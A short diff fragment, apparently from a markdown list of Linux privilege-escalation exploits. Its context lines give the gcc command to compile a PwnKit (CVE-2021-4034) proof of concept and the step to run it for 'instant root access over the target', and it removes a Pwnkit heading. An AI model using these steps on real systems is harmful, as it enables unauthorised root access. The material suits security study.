@@ -714,4 +714,3 @@ pwnkit/gcc cve-2021-4034-poc.c -o exploit
 ./exploit to obtain instant root access over the target
 ```
 </details>
-Pwnkit: CVE-2021-4034
